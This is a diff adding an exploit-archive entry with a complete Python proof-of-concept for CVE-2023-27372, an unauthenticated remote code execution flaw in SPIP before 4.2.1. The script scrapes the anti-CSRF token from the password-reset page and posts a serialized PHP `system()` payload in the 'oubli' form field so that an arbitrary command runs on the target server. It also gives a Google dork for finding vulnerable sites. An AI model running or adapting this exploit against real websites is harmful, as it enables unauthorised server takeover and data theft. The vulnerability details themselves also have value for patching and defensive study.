@@ -1,0 +1,77 @@
+id: 38808
+date: 06/26/2023
+title: SPIP v4.2.0 - Remote Code Execution (Unauthenticated) Exploit
+author: nuts7
+cves: CVE-2023-27372
+
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+# Exploit Title: SPIP v4.2.1 - Remote Code Execution (Unauthenticated)
+# Google Dork: inurl:"/spip.php?page=login"
+# Exploit Author: nuts7 (https://github.com/nuts7/CVE-2023-27372)
+# Vendor Homepage: https://www.spip.net/
+# Software Link: https://files.spip.net/spip/archives/
+# Version: < 4.2.1 (Except few fixed versions indicated in the description)
+# Tested on: Ubuntu 20.04.3 LTS, SPIP 4.0.0
+# CVE reference : CVE-2023-27372 (coiffeur)
+# CVSS : 9.8 (Critical)
+#
+# Vulnerability Description:
+#
+# SPIP before 4.2.1 allows Remote Code Execution via form values in the public area because serialization is mishandled. Branches 3.2, 4.0, 4.1 and 4.2 are concerned. The fixed versions are 3.2.18, 4.0.10, 4.1.8, and 4.2.1.
+# This PoC exploits a PHP code injection in SPIP. The vulnerability exists in the `oubli` parameter and allows an unauthenticated user to execute arbitrary commands with web user privileges.
+#
+# Usage: python3 CVE-2023-27372.py http://example.com
+
+import argparse
+import bs4
+import html
+import requests
+
+def parseArgs():
+    parser = argparse.ArgumentParser(description="Poc of CVE-2023-27372 SPIP < 4.2.1 - Remote Code Execution by nuts7")
+    parser.add_argument("-u", "--url", default=None, required=True, help="SPIP application base URL")
+    parser.add_argument("-c", "--command", default=None, required=True, help="Command to execute")
+    parser.add_argument("-v", "--verbose", default=False, action="store_true", help="Verbose mode. (default: False)")
+    return parser.parse_args()
+
+def get_anticsrf(url):
+    r = requests.get('%s/spip.php?page=spip_pass' % url, timeout=10)
+    soup = bs4.BeautifulSoup(r.text, 'html.parser')
+    csrf_input = soup.find('input', {'name': 'formulaire_action_args'})
+    if csrf_input:
+        csrf_value = csrf_input['value']
+        if options.verbose:
+            print("[+] Anti-CSRF token found : %s" % csrf_value)
+        return csrf_value
+    else:
+        print("[-] Unable to find Anti-CSRF token")
+        return -1
+
+def send_payload(url, payload):
+    data = {
+        "page": "spip_pass",
+        "formulaire_action": "oubli",
+        "formulaire_action_args": csrf,
+        "oubli": payload
+    }
+    r = requests.post('%s/spip.php?page=spip_pass' % url, data=data)
+    if options.verbose:
+        print("[+] Execute this payload : %s" % payload)
+    return 0
+
+if __name__ == '__main__':
+    options = parseArgs()
+
+    requests.packages.urllib3.disable_warnings()
+    requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
+    try:
+        requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
+    except AttributeError:
+        pass
+
+    csrf = get_anticsrf(url=options.url)
+    send_payload(url=options.url, payload="s:%s:\"<?php system('%s'); ?>\";" % (20 + len(options.command), options.command))
+
+#  0day.today [2023-06-26]  #
